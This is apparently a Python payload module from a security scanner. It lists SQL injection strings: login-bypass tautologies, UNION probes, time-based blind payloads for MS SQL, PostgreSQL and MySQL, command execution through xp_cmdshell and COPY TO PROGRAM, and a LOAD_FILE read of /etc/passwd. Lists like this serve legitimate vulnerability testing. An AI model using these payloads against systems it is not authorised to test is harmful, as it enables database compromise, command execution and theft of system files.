"""Пейлоады SQL: исходные наборы и порядок проверок сохранены."""

from typing import Final

SAFE_SQL_PAYLOADS: Final[list[str]] = [
    "'",
    '"',
    "`",
    "' OR '1'='1 -- ",
    '" OR "1"="1" -- ',
    "1' OR 1=1--",
    "1' OR 'a'='a' -- ",
    "admin' -- ",
    "' OR SLEEP(5)--",
    "' UNION SELECT NULL,NULL--",
    "' AND 1=(SELECT COUNT(*) FROM tabname);-- ",
    "' OR TRUE-- ",
    "'/**/OR/**/1=1-- ",
    "' OR 'a'='a'-- ",
]


SQLI_PAYLOADS: Final[list[str]] = ["'", '"', "' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", '" OR 1=1 --']


ADVANCED_SQL_PAYLOADS: Final[list[str]] = [
    "'; WAITFOR DELAY '00:00:05'--",  # Time-based для MS SQL
    "'; SELECT pg_sleep(5)--",  # Time-based для PostgreSQL
    "'; SELECT SLEEP(5)--",  # Time-based для MySQL
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",  # Command execution для MS SQL
    "'; COPY (SELECT '') TO PROGRAM 'ping 127.0.0.1'--",  # Command execution для PostgreSQL
    "'; UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--",  # File read для MySQL
]


__all__ = ["ADVANCED_SQL_PAYLOADS", "SAFE_SQL_PAYLOADS", "SQLI_PAYLOADS"]
